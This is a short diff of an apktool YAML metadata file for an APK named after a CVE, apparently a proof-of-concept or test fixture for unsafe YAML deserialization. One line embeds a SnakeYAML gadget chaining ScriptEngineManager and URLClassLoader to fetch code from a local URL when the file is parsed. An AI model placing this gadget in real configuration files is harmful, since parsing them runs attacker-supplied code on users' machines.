@@ -1,20 +1,13 @@
-!!brut.androlib.meta.MetaInfo
 apkFileName: cve20220476.apk
 some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["https://127.0.0.1:8000"]]]]
 doNotCompress:
 - arsc
 resourcesInfo:
-  packageId: '127'
-  packageName: null
-  sparseEntries: false
+  packageId: 127
 sdkInfo:
-  minSdkVersion: '25'
-  targetSdkVersion: '30'
+  minSdkVersion: 25
+  targetSdkVersion: 30
 usesFramework:
   ids:
   - 1
-  tag: null
 version: 2.6.1-ddc4bb-SNAPSHOT
-versionInfo:
-  versionCode: null
-  versionName: null
